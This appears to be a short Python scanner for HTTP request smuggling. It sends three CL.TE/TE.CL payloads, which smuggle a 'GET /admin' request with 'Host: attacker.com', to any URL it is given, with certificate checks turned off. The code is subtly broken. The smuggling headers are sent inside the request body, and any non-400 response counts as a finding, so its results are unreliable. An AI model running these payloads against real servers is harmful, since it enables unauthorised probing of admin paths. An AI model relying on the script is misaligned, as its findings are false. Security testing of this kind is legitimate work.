#!/usr/bin/env python3
"""
HTTP Request Smuggling Scanner
Tests for HTTP request smuggling vulnerabilities
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    ("Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: attacker.com", "CL.TE"),
    ("Content-Length: 44\r\n\r\nGET /admin HTTP/1.1\r\nHost: attacker.com\r\n\r\n0\r\n\r\n", "TE.CL"),
    ("Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: x", "CL.TE.2"),
]

def scan(target):
    print(f"[*] HTTP Request Smuggling Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    
    for payload, ptype in PAYLOADS:
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/octet-stream',
        }
        try:
            r = requests.post(target, data=payload, headers=headers, timeout=10, verify=False)
            if r.status_code != 400:
                print(f"[?] Possible {ptype}: {r.status_code}")
                found.append(ptype)
        except:
            pass
    
    print("\n" + "="*50)
    if found:
        print(f"[!] Found {len(found)} potential issues")
    else:
        print("[*] No request smuggling detected")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Request Smuggling Scanner')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)